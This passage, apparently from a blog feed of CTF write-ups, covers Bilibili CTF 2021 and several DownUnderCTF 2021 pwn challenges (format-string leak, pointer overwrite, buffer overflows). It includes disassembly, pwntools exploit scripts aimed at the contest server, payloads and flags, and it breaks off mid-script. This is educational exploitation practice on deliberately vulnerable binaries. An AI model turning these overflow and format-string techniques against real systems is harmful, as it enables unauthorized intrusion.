<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># C:\Users\aynakeya&gt;adb shell su 0 setenforce 0</span><br><span class="line">#</span><br><span class="line"># C:\Users\aynakeya&gt;adb shell</span><br><span class="line"># 1|generic_x86:/ $ su</span><br><span class="line"># generic_x86:/ # echo &quot;123&quot; &gt; /data/2233</span><br><span class="line"># generic_x86:/ # su</span><br><span class="line"># generic_x86:/ # chmod 777 /data/</span><br><span class="line"># generic_x86:/ # chmod 77 /data/2233</span><br><span class="line"># generic_x86:/ # chmod 777 /data/2233</span><br><span class="line"># generic_x86:/ # chown everybody:everybody /data/2233</span><br><span class="line"># generic_x86:/ # chown everybody:everybody /data/</span><br><span class="line"># generic_x86:/ # cat /data/2233</span><br><span class="line"># 123</span><br><span class="line"># b1</span><br><span class="line"># 39</span><br><span class="line"># 81</span><br><span class="line"># f4</span><br><span class="line"># 5a</span><br><span class="line"># e9</span><br><span class="line"># 96</span><br><span class="line"># d4</span><br><span class="line"># bc</span><br><span class="line"># 04</span><br><span class="line"># be</span><br><span class="line"># 5b</span><br><span class="line"># 34</span><br><span class="line"># 66</span><br><span class="line"># 2a</span><br><span class="line"># 78</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当然有dalao贴出了代码，我也不知道是怎么做到的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># from https://www.52pojie.cn/thread-1532604-2-1.html</span><br><span class="line">a = &#x27;bili_2233_3322&#x27;</span><br><span class="line">b = &#x27;bili_3322_2233&#x27;</span><br><span class="line">amd5 = hashlib.md5(a.encode()).digest()</span><br><span class="line">bmd5 = hashlib.md5(b.encode()).digest()</span><br><span class="line">for i in range(len(amd5)):</span><br><span class="line">    print(hex(amd5[i])[2:].zfill(2), end=&#x27;&#x27;)</span><br><span class="line">    print(hex(bmd5[i])[2:].zfill(2), end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>

<p>flag: b13981f4-5ae996d4-bc04be5b-34662a78</p>
<h1 id="0x7-风控"><a href="#0x7-风控" class="headerlink" title="0x7 风控"></a>0x7 风控</h1><p>拿一半分的方法，大概就是筛去爬虫，然后取访问次数最多的几个ip，其他就不知道了。</p>
<p>cr你隔这白嫖风控算法呐？</p>
]]></content>
  </entry>
  <entry>
    <title>Bilibili CTF 2021</title>
    <url>/ctf-writeup/2021/bilibilictf/index.html</url>
    <content><![CDATA[<h1 id="Bilibili-CTF-2021"><a href="#Bilibili-CTF-2021" class="headerlink" title="Bilibili CTF 2021"></a>Bilibili CTF 2021</h1><h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./bilibili-ctf-2021">writeup</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>[writeup][DownUnderCTF 2021] pwn Leaking like a sieve</title>
    <url>/ctf-writeup/2021/downunderctf/ductf2021-pwn-Leaking-like-a-sieve.html</url>
    <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>it is a typical printf problem. it ask as a string, and then out. </p>
<p>we can use string format to get the data.</p>
<p>In x64 system. the first argument is in rdi, and 2-6 argument are stored in register.</p>
<span id="more"></span>

<table>
<thead>
<tr>
<th align="center">Register</th>
<th align="center">Purpose</th>
<th align="center">Saved across calls</th>
</tr>
</thead>
<tbody><tr>
<td align="center">%rax</td>
<td align="center">temp register; return value</td>
<td align="center">No</td>
</tr>
<tr>
<td align="center">%rbx</td>
<td align="center">callee-saved</td>
<td align="center">Yes</td>
</tr>
<tr>
<td align="center">%rcx</td>
<td align="center">used to pass 4th argument to functions</td>
<td align="center">No</td>
</tr>
<tr>
<td align="center">%rdx</td>
<td align="center">used to pass 3rd argument to functions</td>
<td align="center">No</td>
</tr>
<tr>
<td align="center">%rsp</td>
<td align="center">stack pointer</td>
<td align="center">Yes</td>
</tr>
<tr>
<td align="center">%rbp</td>
<td align="center">callee-saved; base pointer</td>
<td align="center">Yes</td>
</tr>
<tr>
<td align="center">%rsi</td>
<td align="center">used to pass 2nd argument to functions</td>
<td align="center">No</td>
</tr>
<tr>
<td align="center">%rdi</td>
<td align="center">used to pass 1st argument to functions</td>
<td align="center">No</td>
</tr>
<tr>
<td align="center">%r8</td>
<td align="center">used to pass 5th argument to functions</td>
<td align="center">No</td>
</tr>
<tr>
<td align="center">%r9</td>
<td align="center">used to pass 6th argument to functions</td>
<td align="center">No</td>
</tr>
<tr>
<td align="center">%r10-r11</td>
<td align="center">temporary</td>
<td align="center">No</td>
</tr>
<tr>
<td align="center">%r12-r15</td>
<td align="center">callee-saved registers</td>
<td align="center">Yes</td>
</tr>
</tbody></table>
<p>However, after all the register are used, program get value from <strong>stack</strong> which is <strong>rsp</strong>.</p>
<p>and rsp indicate a local variable <code>var_60h</code></p>
<p>according to the disassembly, <code>var_60h</code> is a pointer to s, which store the flag.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000011ef      lea     rax, [s]</span><br><span class="line">0x000011f3      mov     qword [var_60h], rax</span><br></pre></td></tr></table></figure>

<p>so we can let printf print 7th argument (which is rsp) as string.</p>
<p>by using <code>%p%p%p%p%p %s</code> or <code>%6$s</code></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main (int argc, char **argv, char **envp);</span><br><span class="line">; var int64_t var_60h @ rbp-0x60</span><br><span class="line">; var FILE *stream @ rbp-0x58</span><br><span class="line">; var char *format @ rbp-0x50</span><br><span class="line">; var char *s @ rbp-0x30</span><br><span class="line">; var int64_t var_8h @ rbp-0x8</span><br><span class="line">0x000011d8      push    rbp</span><br><span class="line">0x000011d9      mov     rbp, rsp</span><br><span class="line">0x000011dc      sub     rsp, 0x60</span><br><span class="line">0x000011e0      mov     rax, qword fs:[0x28]</span><br><span class="line">0x000011e9      mov     qword [var_8h], rax</span><br><span class="line">0x000011ed      xor     eax, eax</span><br><span class="line">0x000011ef      lea     rax, [s]</span><br><span class="line">0x000011f3      mov     qword [var_60h], rax</span><br><span class="line"></span><br><span class="line">int main (int argc, char **argv, char **envp);</span><br><span class="line">; var int64_t var_60h @ rbp-0x60</span><br><span class="line">; var FILE *stream @ rbp-0x58</span><br><span class="line">; var char *format @ rbp-0x50</span><br><span class="line">; var char *s @ rbp-0x30</span><br><span class="line">; var int64_t var_8h @ rbp-0x8</span><br><span class="line"></span><br><span class="line">void main(void)</span><br><span class="line">&#123;</span><br><span class="line">    int64_t iVar1;</span><br><span class="line">    int64_t in_FS_OFFSET;</span><br><span class="line">    int64_t var_60h;</span><br><span class="line">    FILE *stream;</span><br><span class="line">    char *format;</span><br><span class="line">    char *s;</span><br><span class="line">    int64_t var_8h;</span><br><span class="line">    </span><br><span class="line">    var_8h = *(int64_t *)(in_FS_OFFSET + 0x28);</span><br><span class="line">    buffer_init();</span><br><span class="line">    iVar1 = fopen(&quot;./flag.txt&quot;, 0x2008);</span><br><span class="line">    if (iVar1 == 0) &#123;</span><br><span class="line">        puts(&quot;The flag file isn\&#x27;t loading. Please contact an organiser if you are running this on the shell server.&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    fgets(&amp;s, 0x20, iVar1);</span><br><span class="line">    do &#123;</span><br><span class="line">        puts(&quot;What is your name?&quot;);</span><br><span class="line">        fgets(&amp;format, 0x20, _stdin);</span><br><span class="line">        printf(&quot;\nHello there, &quot;);</span><br><span class="line">        printf(&amp;format);</span><br><span class="line">        putchar(10);</span><br><span class="line">    &#125; while( true );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>DUCTF{f0rm4t_5p3c1f13r_m3dsg!}</p>
]]></content>
  </entry>
  <entry>
    <title>[writeup][DownUnderCTF 2021] pwn-babygame</title>
    <url>/ctf-writeup/2021/downunderctf/ductf2021-pwn-babygame.html</url>
    <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="vuln-1"><a href="#vuln-1" class="headerlink" title="vuln 1"></a>vuln 1</h3><p>in game() function, it will ask us to provide number that is equals the first 4 bytes of <code>/dev/urandom</code>, if we guess it right, it will give us a shell. however guessing is not possible.</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// from main</span><br><span class="line"></span><br><span class="line">_RANDBUF = &quot;/dev/urandom&quot;;</span><br><span class="line"></span><br><span class="line">// from game()</span><br><span class="line">    uVar2 = fopen(_RANDBUF, 0x2098);</span><br><span class="line">    fread(&amp;ptr, 1, 4, uVar2);</span><br><span class="line">    printf(&quot;guess: &quot;);</span><br><span class="line">    iVar1 = get_num();</span><br><span class="line">    if (iVar1 == ptr) &#123;</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="vuln-2"><a href="#vuln-2" class="headerlink" title="vuln 2"></a>vuln 2</h3><p>since <code>NAME</code> if 0x20 bytes long, so if we can write fill NAME with 0x20 bytes long, it will print out the next variable in the stack.</p>
<p><em>because if the entire buff is filled, the string will not terminate and continue reading until we get a null bytes.</em></p>
<p>and it set_name using <code>strlen</code>, so the total length would be 0x20+(length until it meet a null bytes)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// from print_username()</span><br><span class="line">	puts(NAME);</span><br><span class="line"></span><br><span class="line">// from set_username()</span><br><span class="line">    uVar2 = strlen(NAME);</span><br><span class="line">    fread(NAME, 1, uVar2, uVar1);</span><br></pre></td></tr></table></figure>

<p>since the <code>_RANDBUF</code> is just beblow the <code>NAME</code>, we can first get the pointer of <code>_RANDBUF</code> and change the pointer in <code>_RANDBUF</code> to an known file, in this case we use <code>/bin/sh</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;-- NAME:</span><br><span class="line">0x000040a0-0x000040c0</span><br><span class="line">;-- RANDBUF:</span><br><span class="line">0x000040c0-0x000040c8</span><br></pre></td></tr></table></figure>

<h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><p>first write 32 bytes of name, than print name to get the pointer of <code>_RANDBUF</code>, after we got pointer of <code>_RANDBUF</code> we can use set_name to change this address to a existing <code>/bin/sh</code> string by offset.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;-- str.dev_urandom:</span><br><span class="line">0x00002024          .string &quot;/dev/urandom&quot; ; len=13</span><br><span class="line">;-- str.bin_sh:</span><br><span class="line">0x000020a3          .string &quot;/bin/sh&quot; ; len=8</span><br></pre></td></tr></table></figure>

<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31907&#x27; babygame</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;babygame&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31907)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    Canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line">with open(&quot;/bin/sh&quot;,&quot;rb&quot;) as f:</span><br><span class="line">    a = f.read(4)</span><br><span class="line">    print(&quot;num&quot;,int.from_bytes(a,&quot;little&quot;))</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">io.sendafter(b&quot;name?\n&quot;,b&quot;a&quot;*32)</span><br><span class="line">io.sendafter(b&quot;Username\n&gt; &quot;,b&quot;2&quot;)</span><br><span class="line">print(io.recv(32))</span><br><span class="line">a = io.recvn(6)</span><br><span class="line"># b = io.recvn(6)</span><br><span class="line">ptr = (int.from_bytes(a,&quot;little&quot;)+0x20a3-0x2024).to_bytes(0x6,&quot;little&quot;)</span><br><span class="line">print(ptr)</span><br><span class="line">io.sendafter(b&quot;Username\n&gt; &quot;,b&quot;1&quot;)</span><br><span class="line">print(&quot;overwrite pointer&quot;)</span><br><span class="line">io.sendafter(b&quot;username to?\n&quot;,b&quot;a&quot;*32+ptr)</span><br><span class="line">print(&quot;overwrite pointer ok&quot;)</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(b&quot;1337&quot;)</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(b&#x27;1179403647&#x27;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>DUCTF{whats_in_a_name?_5aacfc58}</p>
]]></content>
  </entry>
  <entry>
    <title>[writeup][DownUnderCTF 2021] pwn-deadcode</title>
    <url>/ctf-writeup/2021/downunderctf/ductf2021-pwn-deadcode.html</url>
    <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>no pie enable. so we can simply overwrite.</p>
<p>note that there are <code>gets</code> without length, which can perform <strong>buffoverflow</strong></p>
<p><img data-src="/./images/20211009120913.png" alt="stack"></p>
<p>since s is above var_8h, we can write random 16 bytes + 0xdeadc0de in 8 bytes to overwrite var_8h to value of 0xdeadc0de, which will lead us to the shell.</p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nt main (int argc, char **argv, char **envp);</span><br><span class="line">; var char *s @ rbp-0x20</span><br><span class="line">; var uint64_t var_8h @ rbp-0x8</span><br><span class="line">0x00401195      push    rbp</span><br><span class="line">0x00401196      mov     rbp, rsp</span><br><span class="line">0x00401199      sub     rsp, 0x20</span><br><span class="line">0x0040119d      mov     qword [var_8h], 0</span><br><span class="line">0x004011a5      mov     eax, 0</span><br><span class="line">0x004011aa      call    buffer_init ; sym.buffer_init</span><br><span class="line">0x004011af      lea     rdi, str.I_m_developing_this_new_application_in_C__I_ve_setup_some_code_for_the_new_features_but_it_s_not__a_live_yet. ; 0x402008 ; const char *s</span><br><span class="line">0x004011b6      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011bb      lea     rdi, str.What_features_would_you_like_to_see_in_my_app ; 0x402078 ; const char *s</span><br><span class="line">0x004011c2      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011c7      lea     rax, [s]</span><br><span class="line">0x004011cb      mov     rdi, rax   ; char *s</span><br><span class="line">0x004011ce      mov     eax, 0</span><br><span class="line">0x004011d3      call    gets       ; sym.imp.gets ; char *gets(char *s)</span><br><span class="line">0x004011d8      mov     eax, 0xdeadc0de</span><br><span class="line">0x004011dd      cmp     qword [var_8h], rax</span><br><span class="line">0x004011e1      jne     0x401200</span><br><span class="line">0x004011e3      lea     rdi, str.Maybe_this_code_isn_t_so_dead... ; 0x4020a8 ; const char *s</span><br><span class="line">0x004011ea      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011ef      lea     rdi, str.bin_sh ; 0x4020cb ; const char *string</span><br><span class="line">0x004011f6      mov     eax, 0</span><br><span class="line">0x004011fb      call    system     ; sym.imp.system ; int system(const char *string)</span><br><span class="line">0x00401200      mov     eax, 0</span><br><span class="line">0x00401205      leave</span><br><span class="line">0x00401206      ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">undefined8 main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char *s;</span><br><span class="line">    uint64_t var_8h;</span><br><span class="line">    </span><br><span class="line">    var_8h = 0;</span><br><span class="line">    buffer_init();</span><br><span class="line">    puts(</span><br><span class="line">        &quot;\nI\&#x27;m developing this new application in C, I\&#x27;ve setup some code for the new features but it\&#x27;s not (a)live yet.&quot;</span><br><span class="line">        );</span><br><span class="line">    puts(&quot;\nWhat features would you like to see in my app?&quot;);</span><br><span class="line">    gets(&amp;s);</span><br><span class="line">    if (var_8h == 0xdeadc0de) &#123;</span><br><span class="line">        puts(&quot;\n\nMaybe this code isn\&#x27;t so dead...&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31916&#x27; deadcode</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;deadcode&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31916)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(os.urandom(0x20-0x8)+(0xdeadc0de).to_bytes(0x8,&quot;little&quot;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}</p>
]]></content>
  </entry>
  <entry>
    <title>[writeup][DownUnderCTF 2021] pwn-outbackdoor</title>
    <url>/ctf-writeup/2021/downunderctf/ductf2021-pwn-outbackdoor.html</url>
    <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="vuln-1"><a href="#vuln-1" class="headerlink" title="vuln 1"></a>vuln 1</h3><p>there is a backdoor function called <code>outBackdoor</code> in the function, which give as a shell.</p>
<p><img data-src="/./images/2021-10-09_121913.jpg" alt="stack"></p>
<span id="more"></span>

<h3 id="vuln-2"><a href="#vuln-2" class="headerlink" title="vuln 2"></a>vuln 2</h3><p>the main function utilze gets, we can overwrite rip to outBackdoor which give as a shell when return.</p>
<p>simplely write 0x10 bytes + 0x8 btyes (rbp size) + 0x004011d7 in 8 bytes to overwrite rip and get flag</p>
<p>however, this will cause <strong>EOF error</strong></p>
<p>this is because the stack is <strong>not aligned</strong>, we need to align the stack to 16x.</p>
<p>since it is x64 system, each data worth 8 bytes, add a ret operation to pop 1 value stack before call the backdoor will solve this problem.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary outBackdoor | grep &quot;: ret&quot;</span><br><span class="line">0x0000000000401016 : ret</span><br><span class="line">0x000000000040117a : ret 0xfffe</span><br><span class="line">0x0000000000401062 : retf 0x2f</span><br></pre></td></tr></table></figure>

<p>so write x10 bytes + 0x8 btyes (rbp size) + 0x401016 + 0x004011d7 to get shell.</p>
<h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main (int argc, char **argv, char **envp);</span><br><span class="line">; var char *s @ rbp-0x10</span><br><span class="line">0x00401195      push rbp</span><br><span class="line">0x00401196      mov rbp, rsp</span><br><span class="line">0x00401199      sub rsp, 0x10</span><br><span class="line">0x0040119d      mov eax, 0</span><br><span class="line">0x004011a2      call buffer_init   ; sym.buffer_init</span><br><span class="line">0x004011a7      lea rdi, str.Fool_me_once__shame_on_you._Fool_me_twice__shame_on_me. ; 0x402008 ; const char *s</span><br><span class="line">0x004011ae      call puts          ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011b3      lea rdi, str.Seriously_though__what_features_would_be_cool__Maybe_it_could_play_a_song ; 0x402048 ; const char *s</span><br><span class="line">0x004011ba      call puts          ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011bf      lea rax, [s]</span><br><span class="line">0x004011c3      mov rdi, rax       ; char *s</span><br><span class="line">0x004011c6      mov eax, 0</span><br><span class="line">0x004011cb      call gets          ; sym.imp.gets ; char *gets(char *s)</span><br><span class="line">0x004011d0      mov eax, 0</span><br><span class="line">0x004011d5      leave</span><br><span class="line">0x004011d6      ret</span><br><span class="line">outBackdoor ();</span><br><span class="line">0x004011d7      push rbp</span><br><span class="line">0x004011d8      mov rbp, rsp</span><br><span class="line">0x004011db      lea rdi, str.W...w...Wait__Who_put_this_backdoor_out_back_here ; 0x402098 ; const char *s</span><br><span class="line">0x004011e2      call puts          ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011e7      lea rdi, str.bin_sh ; 0x4020cd ; const char *string</span><br><span class="line">0x004011ee      mov eax, 0</span><br><span class="line">0x004011f3      call system        ; sym.imp.system ; int system(const char *string)</span><br><span class="line">0x004011f8      nop</span><br><span class="line">0x004011f9      pop rbp</span><br><span class="line">0x004011fa      ret</span><br><span class="line">0x004011fb      nop dword [rax + rax]</span><br></pre></td></tr></table></figure>


<h2 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31921&#x27; outBackdoor</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;outBackdoor&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31921)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span 